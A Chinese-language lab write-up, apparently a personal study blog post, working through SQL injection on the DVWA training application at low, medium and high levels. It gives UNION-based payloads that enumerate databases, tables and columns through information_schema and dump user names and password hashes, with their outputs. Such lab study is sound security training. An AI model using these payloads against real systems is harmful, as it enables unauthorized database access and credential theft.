---
layout: post
title: "DVWA SQL Injection (教學用)"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_SQL_Injection
author: ""
tags: ['DVWA', 'SQL_Injection']
---



# DVWA　SQL Injection (教學用)
###### tags: `DVWA`




## low


### code 
```
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

### 猜測語句
字串型 or 數字型
```
select * from table where id = 1

select * from table where id = '1'

```

### 閉合注入
(發現 字串型 可以注入) 
```
1' or '1

' or '1
```




### version 
大概猜測出來是 mysql 
```
1' or 1 #

1' or 1 --(一個空白)

// +號會被轉成 %2B 所以需要用 BP 修改
1' or 1 --+

```





### 欄位數 
猜出2

```
1' union select NULL #
1' union select NULL,NULL #



1' UNION SELECT @ #
1' UNION SELECT @,@ #
```


```
1' ORDER BY 1 #

1' ORDER BY 2 #

1' ORDER BY 3 #
```


```
1' GROUP  BY 1 #

1' GROUP  BY 2 #

1' GROUP  BY 3 #
```


```
1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 #




1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 #
```




### information_schema 提取數據庫

information_schema 5.0 以上有
information_schema 5.0 以下暴力跑表





### 所有資料庫
```

1' UNION SELECT @, gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata #


//顯示
|information_schema|,|dvwa|,|my_db|,|mysql|,|performance_schema|,|sys|
```



### dvwa 所有表
```
1' UniOn Select @, gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema ='dvwa' #

//顯示
|guestbook|,|users|
```



### users 表所有 column_name
```
1' UniOn Select @, gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name ='users' #


//顯示
|user_id|,|first_name|,|last_name|,|user|,|password|,|avatar|,|last_login|,|failed_login|,|USER|,|CURRENT_CONNECTIONS|,|TOTAL_CONNECTIONS|
```




### users 表所有帳號 密碼
```
1' UniOn Select  @, gRoUp_cOncaT(0x7c,user,0x7C) fRoM users #

//顯示
|admin|,|gordonb|,|1337|,|pablo|,|smithy|



1' UniOn Select  @, gRoUp_cOncaT(0x7c,password,0x7C) fRoM users #

//顯示
|f1c1592588411002af340cbaedd6fc33|,|e99a18c428cb38d5f260853678922e03|,|8d3533d75ae2c3966d7e0d4fcc69216b|,|0d107d09f5bbe40cade3de5c71e9e9b7|,|5f4dcc3b5aa765d61d8327deb882cf99|
```


## medium

這題是post 型，所以用BP改包，基本上和上一題一樣，只不過是數字型注入。

### 先看code


```php
$id = $_POST[ 'id' ];

$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";

```
### mysqli_real_escape_string
```
mysql_real_escape_string() 函數轉義 SQL 語句中使用的字符串中的特殊字符。

下列字符受影響：

\x00
\n
\r
\
'
"
\x1a
如果成功，則該函數返回被轉義的字符串。如果失敗，則返回 false。

```

不過完全沒用，這題是數字型注入，所以不需要引號，或雙引號。



### payload:





### 猜測語句
字串型 or 數字型
```select * from table where id = 1

select * from table where id = '1'

```





### 注入
(發現可以注入是數字型)
```1 or 1
```



### version 
大概猜測出來是 mysql 
```1 or 1 #

1 or 1 --(一個空白)

// +號會被轉成 %2B 所以需要用 BP 修改
1 or 1 --+

```




## 欄位數 
猜出2

```1 union select NULL #
1 union select NULL,NULL #



1 UNION SELECT @ #
1 UNION SELECT @,@ #
```

```1 ORDER BY 1 #

1 ORDER BY 2 #

1 ORDER BY 3 #
```

```1 GROUP  BY 1 #

1 GROUP  BY 2 #

1 GROUP  BY 3 #
```

```1 ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 #




1 GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100 #
```



### information_schema 提取數據庫

information_schema 5.0 以上有
information_schema 5.0 以下暴力跑表





### 所有資料庫
```
1 UNION SELECT @, gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata #


//顯示
|information_schema|,|dvwa|,|my_db|,|mysql|,|performance_schema|,|sys|
```


### dvwa 所有表
```1 UniOn Select @, gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema ='dvwa' #

//顯示
|guestbook|,|users|
```


### users 表所有 column_name
```1 UniOn Select @, gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name ='users' #


//顯示
|user_id|,|first_name|,|last_name|,|user|,|password|,|avatar|,|last_login|,|failed_login|,|USER|,|CURRENT_CONNECTIONS|,|TOTAL_CONNECTIONS|
```



### users 表所有帳號  密碼
```1 UniOn Select  @, gRoUp_cOncaT(0x7c,user,0x7C) fRoM users #

//顯示
|admin|,|gordonb|,|1337|,|pablo|,|smithy|



1 UniOn Select  @, gRoUp_cOncaT(0x7c,password,0x7C) fRoM users #

//顯示
|f1c1592588411002af340cbaedd6fc33|,|e99a18c428cb38d5f260853678922e03|,|8d3533d75ae2c3966d7e0d4fcc69216b|,|0d107d09f5bbe40cade3de5c71e9e9b7|,|5f4dcc3b5aa765d61d8327deb882cf99|
```

## high 

### 主頁面
http://localhost/vulnerabilities/sqli/


### 點擊click 會叫出 子頁面
http://localhost/vulnerabilities/sqli/session-input.php


子頁面輸入，然後刷新主頁面。

所以比較麻煩的是，BP repeater 輸入是子頁，無法自動抓取主頁的刷新(應該是有插件或是其他設定，不過之後再研究，我記得有類似的攻能)。

所以就是手動刷，或是交給自動化工具


### code:

high.php
```php
$id = $_SESSION[ 'id' ];

// Check database
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );
```

session-input.php
```php
if( isset( $_POST[ 'id' ] ) ) {
	$_SESSION[ 'id' ] =  $_POST[ 'id' ];
	//$page[ 'body' ] .= "Session ID set!<br /><br /><br />";
	$page[ 'body' ] .= "Session ID: {$_SESSION[ 'id' ]}<br /><br /><br />";
	$page[ 'body' ] .= "<script>window.opener.location.reload(true);</script>";
}
```


剩下的就都一樣，字串型注入。